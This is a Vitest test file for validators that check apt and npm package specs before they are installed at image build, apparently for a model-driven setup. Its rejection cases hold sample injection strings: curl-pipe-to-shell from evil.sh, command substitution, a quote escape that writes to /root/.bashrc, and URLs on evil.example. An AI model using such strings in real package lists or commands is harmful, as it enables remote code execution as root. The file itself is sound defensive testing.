import { describe, expect, it } from 'vitest';
import { assertValidPackageLists, assertValidPackageSpec, isValidAptSpec, isValidNpmSpec } from './package-specs.js';

describe('isValidAptSpec', () => {
  it.each([
    'imagemagick',
    'ffmpeg',
    'jq',
    'sqlite3',
    'ripgrep',
    'zip',
    'librsvg2-bin',
    'libimage-exiftool-perl',
    'g++-12',
    'tesseract-ocr-deu',
    'imagemagick:arm64',
    'ffmpeg=7:5.1.6-0+deb12u1',
    'zip=3.0-13',
  ])('accepts %j', (spec) => {
    expect(isValidAptSpec(spec)).toBe(true);
  });

  it.each([
    ['command chain', 'foo && curl evil.sh | sh'],
    ['semicolon', 'foo;bar'],
    ['command substitution', '$(id)'],
    ['backticks', '`id`'],
    ['space-separated pair', 'foo bar'],
    ['apt long option', '--allow-downgrades'],
    ['apt -o option', '-o=APT::Get::AllowUnauthenticated'],
    ['single quote', "foo'"],
    ['double quote', 'foo"'],
    ['backslash', 'foo\\bar'],
    ['newline', 'foo\nbar'],
    ['path traversal', '../foo'],
    ['absolute path', '/etc/passwd'],
    ['leading dot', '.foo'],
    ['uppercase name', 'ImageMagick'],
    ['empty', ''],
    ['redirect', 'foo>/etc/x'],
  ])('rejects %s', (_label, spec) => {
    expect(isValidAptSpec(spec)).toBe(false);
  });

  it('rejects specs over the length cap', () => {
    expect(isValidAptSpec('a'.repeat(100))).toBe(true);
    expect(isValidAptSpec('a'.repeat(101))).toBe(false);
  });

  it.each([undefined, null, 42, {}, ['imagemagick']])('rejects non-string %j', (spec) => {
    expect(isValidAptSpec(spec)).toBe(false);
  });
});

describe('isValidNpmSpec', () => {
  it.each([
    'prettier',
    'vercel',
    'tavily-mcp',
    'pkg@1.2.3',
    'pkg@latest',
    'pkg@^1.2',
    'pkg@~1.2.3',
    'pkg@1.0.0-beta.1',
    '@scope/pkg',
    '@scope/pkg@1.2.3',
    '@scope/pkg@next',
    'github:someone/some-tool',
    'github:someone/some-tool#5008b287',
    'github:owner/repo#feature/branch',
  ])('accepts %j', (spec) => {
    expect(isValidNpmSpec(spec)).toBe(true);
  });

  it.each([
    ['command chain', 'pkg && id'],
    ['semicolon', 'pkg;id'],
    ['command substitution', 'pkg@$(id)'],
    ['single quote closes the .npmrc echo', "pkg' >> /root/.bashrc #"],
    ['double quote', 'pkg"'],
    ['space', 'pkg one'],
    ['newline', 'pkg\nid'],
    ['scope without name', '@scope/'],
    ['bare scope', '@scope'],
    ['leading at with no scope path', '@1.2.3'],
    ['empty version', 'pkg@'],
    ['glob version', 'pkg@1.*'],
    ['comparator range', 'pkg@>=1.0'],
    ['compound range', 'pkg@1.x || 2.x'],
    ['tarball url', 'https://evil.example/x.tgz'],
    ['file spec', 'file:../x'],
    ['git url', 'git+ssh://git@evil.example/x.git'],
    ['github spec with quote', "github:owner/repo#a'b"],
    ['empty', ''],
  ])('rejects %s', (_label, spec) => {
    expect(isValidNpmSpec(spec)).toBe(false);
  });

  it.each([undefined, null, 42, {}])('rejects non-string %j', (spec) => {
    expect(isValidNpmSpec(spec)).toBe(false);
  });
});

describe('assertValidPackageSpec', () => {
  it('returns the spec when valid', () => {
    expect(assertValidPackageSpec('apt', 'imagemagick')).toBe('imagemagick');
    expect(assertValidPackageSpec('npm', '@scope/pkg@1.0.0')).toBe('@scope/pkg@1.0.0');
  });

  it('explains the grammar and the reason so the model can self-correct', () => {
    expect(() => assertValidPackageSpec('apt', 'foo && curl x | sh')).toThrow(/Invalid apt package spec/);
    expect(() => assertValidPackageSpec('apt', 'foo && curl x | sh')).toThrow(/Debian package name/);
    expect(() => assertValidPackageSpec('apt', 'foo && curl x | sh')).toThrow(/as root at image-build time/);
  });

  it('quotes the offending value so metacharacters are visible', () => {
    expect(() => assertValidPackageSpec('npm', "pkg'")).toThrow(/"pkg'"/);
  });
});

describe('assertValidPackageLists', () => {
  it('accepts the empty and absent cases', () => {
    expect(() => assertValidPackageLists({ apt: [], npm: [] })).not.toThrow();
    expect(() => assertValidPackageLists({})).not.toThrow();
  });

  it('accepts realistic lists', () => {
    expect(() =>
      assertValidPackageLists({
        apt: ['imagemagick', 'ffmpeg', 'jq'],
        npm: ['github:someone/some-tool#5008b287', 'vercel@52.2.1'],
      }),
    ).not.toThrow();
  });

  it('rejects a poisoned entry in either list', () => {
    expect(() => assertValidPackageLists({ apt: ['imagemagick', 'foo && id'] })).toThrow(/Invalid apt package spec/);
    expect(() => assertValidPackageLists({ npm: ["pkg' && id"] })).toThrow(/Invalid npm package spec/);
  });

  it('rejects a non-array list', () => {
    expect(() => assertValidPackageLists({ apt: 'imagemagick' })).toThrow(/expected an array/);
  });

  it('caps list length', () => {
    const many = Array.from({ length: 41 }, (_, i) => `pkg${i}`);
    expect(() => assertValidPackageLists({ apt: many })).toThrow(/Too many apt packages: 41/);
    expect(() => assertValidPackageLists({ apt: many.slice(0, 40) })).not.toThrow();
  });

  it('rejects non-string entries', () => {
    expect(() => assertValidPackageLists({ apt: [42] })).toThrow(/Invalid apt package spec/);
  });
});
